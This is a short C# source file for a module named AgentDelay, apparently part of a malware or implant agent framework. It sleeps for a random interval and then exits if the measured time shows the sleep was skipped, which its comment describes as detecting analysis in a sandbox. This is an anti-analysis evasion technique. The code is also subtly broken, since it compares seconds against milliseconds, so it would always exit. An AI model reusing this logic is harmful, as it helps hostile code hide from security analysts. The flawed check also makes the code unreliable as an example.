using Agent.Interfaces;

namespace AgentDelay
{
    public class AgentDelay : IAgentMod
    {
        public async Task Go()
        {
            DateTime start = DateTime.Now;
            Random random = new Random();
            int d = random.Next(60000, 600000);
            //Sleep for a random amount of time between 1 and 10 minutes
            Thread.Sleep(d);

            DateTime end = DateTime.Now;

            double differential = GetSecondsBetween(start, end);

            //If our number is significantly less than d (giving a 10% buffer) then we're being analyzed in a sandbox and should exit
            if (differential < (d * 0.9))
            {
                Environment.Exit(0);
            }
        }
        public double GetSecondsBetween(DateTime earlierTimestamp, DateTime laterTimestamp)
        {
            TimeSpan timeDifference = laterTimestamp - earlierTimestamp;
            return timeDifference.TotalSeconds;
        }
    }
}
